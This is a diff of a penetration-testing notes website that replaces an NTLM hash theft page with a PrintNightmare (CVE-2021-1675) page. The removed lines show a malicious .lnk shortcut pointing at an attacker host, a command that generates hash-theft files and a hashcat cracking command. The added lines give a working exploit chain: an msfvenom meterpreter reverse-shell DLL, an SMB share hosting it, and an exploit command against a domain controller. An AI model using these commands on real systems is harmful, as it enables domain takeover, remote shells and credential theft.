@@ -8,21 +8,21 @@
       
       
       
-        <link rel="canonical" href="https://jacobh.io/Active%20Directory/2.%20Initial%20Compromise/NTLM%20Hash%20Theft/">
+        <link rel="canonical" href="https://jacobh.io/Active%20Directory/2.%20Initial%20Compromise/PrintNightmare/">
       
       
-        <link rel="prev" href="../LLMNR%20Poisoning/">
+        <link rel="prev" href="../Pre-Windows%202000%20Computers/">
       
       
-        <link rel="next" href="../Password%20Stuff/">
+        <link rel="next" href="../Relay%20Attacks/">
       
       
       <link rel="icon" href="../../../assets/favicon.ico">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.19">
     
     
       
-        <title>NTLM Hash Theft - jacobh.io</title>
+        <title>PrintNightmare - jacobh.io</title>
       
     
     
@@ -57,11 +57,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="NTLM Hash Theft - jacobh.io" >
+        <meta  property="og:title"  content="PrintNightmare - jacobh.io" >
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/Active Directory/2. Initial Compromise/NTLM Hash Theft.png" >
+        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/Active Directory/2. Initial Compromise/PrintNightmare.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -69,15 +69,15 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://jacobh.io/Active%20Directory/2.%20Initial%20Compromise/NTLM%20Hash%20Theft/" >
+        <meta  property="og:url"  content="https://jacobh.io/Active%20Directory/2.%20Initial%20Compromise/PrintNightmare/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="NTLM Hash Theft - jacobh.io" >
+        <meta  name="twitter:title"  content="PrintNightmare - jacobh.io" >
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/Active Directory/2. Initial Compromise/NTLM Hash Theft.png" >
+        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/Active Directory/2. Initial Compromise/PrintNightmare.png" >
       
     
     
@@ -100,7 +100,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#theft-files" class="md-skip">
+        <a href="#identify" class="md-skip">
           Skip to content
         </a>
       
@@ -133,7 +133,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              NTLM Hash Theft
+              PrintNightmare
             
           </span>
         </div>
@@ -603,6 +603,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../../1.%20Reconnaissance%20%26%20Enumeration/DNS%20Dump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DNS Dump
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../1.%20Reconnaissance%20%26%20Enumeration/Domain%20User%20Enumeration/" class="md-nav__link">
         
   
@@ -718,12 +741,58 @@
   
   
     <li class="md-nav__item">
+      <a href="../../1.%20Reconnaissance%20%26%20Enumeration/Null%20Session/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Null Session
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../1.%20Reconnaissance%20%26%20Enumeration/Password%20Policy%20Enumeration/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
     Password Policy Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../1.%20Reconnaissance%20%26%20Enumeration/SMB%20Signing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SMB Signing
     
   </span>
   
@@ -881,103 +950,6 @@
                 
   
   
-    
-  
-  
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    NTLM Hash Theft
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
-        
-  
-  
-  <span class="md-ellipsis">
-    NTLM Hash Theft
-    
-  </span>
-  
-
-      </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#theft-files" class="md-nav__link">
-    <span class="md-ellipsis">
-      Theft Files
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#poisoning" class="md-nav__link">
-    <span class="md-ellipsis">
-      Poisoning
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#relaying" class="md-nav__link">
-    <span class="md-ellipsis">
-      Relaying
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc-locations" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc Locations
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
   
   
     <li class="md-nav__item">
@@ -1047,6 +1019,85 @@
                 
   
   
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    PrintNightmare
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    PrintNightmare
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
   
   
     <li class="md-nav__item">
@@ -1102,29 +1153,6 @@
   
   <span class="md-ellipsis">
     ZeroLogon
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../%F0%9F%91%BB%20PrintNightmare/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    👻 PrintNightmare
     
   </span>
   
@@ -1312,6 +1340,29 @@
   
   <span class="md-ellipsis">
     Kerberoasting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../3.%20Credential%20Theft/NTLM%20Hash%20Theft/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NTLM Hash Theft
     
   </span>
   
@@ -2087,6 +2138,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../../5.%20Privilege%20Escalation/Domain/SCCM/Enumerate%20SCCM/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumerate SCCM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/" class="md-nav__link">
         
   
@@ -2509,6 +2583,29 @@
   
   <span class="md-ellipsis">
     Host Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Miscellaneous/MachineAccountQuota/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MachineAccountQuota
     
   </span>
   
@@ -2950,6 +3047,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../Methodologies/%E2%9C%85%20Checklists/Internal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Internal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../../Methodologies/%E2%9C%85%20Checklists/Web%20Application/" class="md-nav__link">
         
   
@@ -3045,12 +3165,58 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../Methodologies/%F0%9F%98%8F%20Cheatsheets/Default%20Credentials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Default Credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../../Methodologies/%F0%9F%98%8F%20Cheatsheets/Misc/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
     Misc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Methodologies/%F0%9F%98%8F%20Cheatsheets/Network%20Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Network Recon
     
   </span>
   
@@ -3171,10 +3337,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_7" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_9" >
         
           
-          <label class="md-nav__link" for="__nav_5_2_7" id="__nav_5_2_7_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5_2_9" id="__nav_5_2_9_label" tabindex="0">
             
   
   
@@ -3187,8 +3353,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_7_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_2_7">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2_9">
             <span class="md-nav__icon md-icon"></span>
             DaForce
           </label>
@@ -3312,10 +3478,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_8" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_10" >
         
           
-          <label class="md-nav__link" for="__nav_5_2_8" id="__nav_5_2_8_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5_2_10" id="__nav_5_2_10_label" tabindex="0">
             
   
   
@@ -3328,8 +3494,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_8_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_2_8">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2_10">
             <span class="md-nav__icon md-icon"></span>
             Linux Privilege Escalation
           </label>
@@ -3660,10 +3826,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_9" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2_11" >
         
           
-          <label class="md-nav__link" for="__nav_5_2_9" id="__nav_5_2_9_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_5_2_11" id="__nav_5_2_11_label" tabindex="0">
             
   
   
@@ -3676,8 +3842,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_9_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_5_2_9">
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_2_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2_11">
             <span class="md-nav__icon md-icon"></span>
             Wifi
           </label>
@@ -5208,36 +5374,18 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#theft-files" class="md-nav__link">
+  <a href="#identify" class="md-nav__link">
     <span class="md-ellipsis">
-      Theft Files
+      Identify
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#poisoning" class="md-nav__link">
+  <a href="#exploit" class="md-nav__link">
     <span class="md-ellipsis">
-      Poisoning
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#relaying" class="md-nav__link">
-    <span class="md-ellipsis">
-      Relaying
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc-locations" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc Locations
+      Exploit
     </span>
   </a>
   
@@ -5262,47 +5410,35 @@
   
 
 
-  <h1>NTLM Hash Theft</h1>
+  <h1>PrintNightmare</h1>
 
-<h2 id="theft-files">Theft Files</h2>
+<p><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p>
+<h2 id="identify">Identify</h2>
 <hr />
-<p>Any writable directory (shares, nfs, locally) where users will list contents you can use certain file types to steal hashes</p>
-<p><strong>Manual: (.lnk)</strong></p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">$objShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">$lnk</span> <span class="p">=</span> <span class="nv">$objShell</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="s2">&quot;\\DC01.domain.local\OpenShare\IT-Driver.lnk&quot;</span><span class="p">)</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">TargetPath</span> <span class="p">=</span> <span class="s2">&quot;\\&lt;AttackerIP&gt;\@ico.png&quot;</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">WindowStyle</span> <span class="p">=</span> <span class="n">1</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">IconLocation</span> <span class="p">=</span> <span class="s2">&quot;%windir%\system32\shell32.dll, 3&quot;</span>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">Description</span> <span class="p">=</span> <span class="s2">&quot;IT Driver&quot;</span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">HotKey</span> <span class="p">=</span> <span class="s2">&quot;Ctrl+Alt+O&quot;</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">Save</span><span class="p">()</span>
+<p><div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a> <span class="n">rpcdump</span><span class="p">.</span><span class="n">py</span> <span class="nv">@172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">5</span> <span class="p">|</span> <span class="n">egrep</span> <span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
 </span></code></pre></div>
-<p><strong>Automated (multi-type):</strong></p>
-<p><a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a></p>
-<p>Generate all file types:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="go">python3 ntlm_theft.py -g all -s &lt;attackerIP&gt; -f &#39;@myfile&#39;</span>
-</span></code></pre></div>
-<p>Monitor for traffic with <a href="https://github.com/SpiderLabs/Responder">Responder</a> on linux or <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> on windows. 
-Hash received? Try to crack it
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>user.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">REG</span> <span class="n">QUERY</span> <span class="s2">&quot;HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint&quot;</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span> <span class="n">NT</span><span class="p">\</span><span class="n">Printers</span><span class="p">\</span><span class="n">PointAndPrint</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="n">RestrictDriverInstallationToAdministrators</span>    <span class="n">REG_DWORD</span>    <span class="n">0x0</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>    <span class="n">NoWarningNoElevationOnInstall</span>    <span class="n">REG_DWORD</span>    <span class="n">0x1</span>
 </span></code></pre></div></p>
-<p>OR:  <a href="../Relay%20Attacks/">Relay Attacks</a></p>
-<h2 id="poisoning">Poisoning</h2>
+<h2 id="exploit">Exploit</h2>
 <hr />
-<ul>
-<li><a href="../LLMNR%20Poisoning/">LLMNR Poisoning</a></li>
-<li><a href="../IPv6%20Attacks/">IPv6 Attacks</a></li>
-</ul>
-<h2 id="relaying">Relaying</h2>
-<hr />
-<ul>
-<li><a href="../Relay%20Attacks/">Relay Attacks</a></li>
-</ul>
-<h2 id="misc-locations">Misc Locations</h2>
-<hr />
-<ul>
-<li><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a></li>
-</ul>
+<p>You need bros version of impacket
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">pip3</span> <span class="n">uninstall</span> <span class="n">impacket</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">cube0x0</span><span class="p">/</span><span class="n">impacket</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">cd </span><span class="n">impacket</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">python3</span> <span class="p">./</span><span class="n">setup</span><span class="p">.</span><span class="n">py</span> <span class="n">install</span>
+</span></code></pre></div>
+<strong>Generate DLL payload</strong>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">8080</span> <span class="o">-f</span> <span class="n">dll</span> <span class="p">&gt;</span> <span class="n">timsync</span><span class="p">.</span><span class="n">dll</span>
+</span></code></pre></div>
+Host payload on smbserver
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">sudo</span> <span class="n">smbserver</span><span class="p">.</span><span class="n">py</span> <span class="n">-smb2support</span> <span class="n">ITShare</span> <span class="n">share</span>
+</span></code></pre></div>
+Start listener, execute payload
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">sudo</span> <span class="n">python3</span> <span class="n">CVE</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="s1">&#39;password&#39;</span><span class="p">@&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="s1">&#39;\\&lt;attackhost&gt;\ITShare\timesync.dll&#39;</span>
+</span></code></pre></div></p>
 
 
 
